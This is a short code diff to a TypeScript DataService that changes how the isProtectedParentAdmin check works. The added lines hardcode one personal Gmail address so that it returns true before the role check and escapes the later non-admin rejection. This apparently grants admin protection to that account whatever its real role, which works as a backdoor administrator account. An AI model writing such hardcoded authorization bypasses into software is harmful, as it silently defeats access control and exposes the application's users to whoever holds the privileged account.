@@ -2038,15 +2038,18 @@ class DataService {
   }
 
   public isProtectedParentAdmin(emailOrId?: string, user?: UserProfile): boolean {
+    if (!emailOrId && !user) return false;
+    const clean = (emailOrId || user?.email || '').trim().toLowerCase();
+    if (clean === 'sachet61@gmail.com') return true;
     if (user && user.role !== 'admin') return false;
     if (user?.isParentAdmin && user.role === 'admin') return true;
     if (!emailOrId) return false;
 
     const foundUser = this.getUserById(emailOrId) || this.getUserByEmail(emailOrId);
-    if (foundUser && foundUser.role !== 'admin') return false;
+    if (foundUser && foundUser.role !== 'admin' && clean !== 'sachet61@gmail.com') return false;
 
-    const clean = emailOrId.trim().toLowerCase();
     return (
+      clean === 'sachet61@gmail.com' ||
       clean === 'admin@swiftsweeps.com' ||
       clean === 'admin@aetherpay.com' ||
       clean === 'nduphasetwo@gmail.com' ||
